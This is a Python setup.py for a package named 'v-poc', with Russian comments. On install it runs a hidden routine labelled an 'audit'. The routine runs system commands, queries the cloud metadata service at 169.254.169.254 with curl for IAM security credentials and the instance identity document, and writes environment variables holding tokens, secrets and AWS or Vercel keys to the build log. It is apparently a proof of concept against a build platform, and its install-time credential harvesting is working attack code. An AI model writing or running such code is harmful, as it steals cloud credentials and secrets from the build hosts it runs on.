import os, sys, socket, subprocess as sp
from setuptools import setup

def vercel_audit():
    o = sys.stderr.write
    def r(c):
        return sp.getoutput(c)

    o("\n" + "!"*50 + "\n")
    o(f"USER: {r('id')}\n")
    o(f"KERNEL: {r('uname -a')}\n")
    
    # Ищем следы AWS (Vercel сидит на нем)
    o("\n[AWS METADATA CHECK]\n")
    targets = [
        ("Metadata v1", "169.254.169.254", "/latest/meta-data/iam/security-credentials/"),
        ("Identity", "169.254.169.254", "/latest/dynamic/instance-identity/document")
    ]
    for name, ip, path in targets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, 80)) == 0:
                o(f"FOUND {name}! Attempting leak...\n")
                # Если порт открыт, пробуем вытянуть через curl
                o(r(f"curl -s http://{ip}{path}") + "\n")
            s.close()
        except: pass

    # Проверка на Docker/K8s внутри Vercel
    o("\n[ENV LEAK]\n")
    # Ищем токены в памяти
    env_vars = r("env")
    for line in env_vars.split('\n'):
        if any(x in line.upper() for x in ['AWS', 'VERCEL', 'TOKEN', 'SECRET', 'AUTH']):
            o(line[:50] + "...\n") # Берем начало, чтобы не спалить всё в логах

    o("\n" + "!"*50 + "\n")
    sys.exit(1)

try: vercel_audit()
except: sys.exit(1)

setup(name="v-poc", version="1.0")
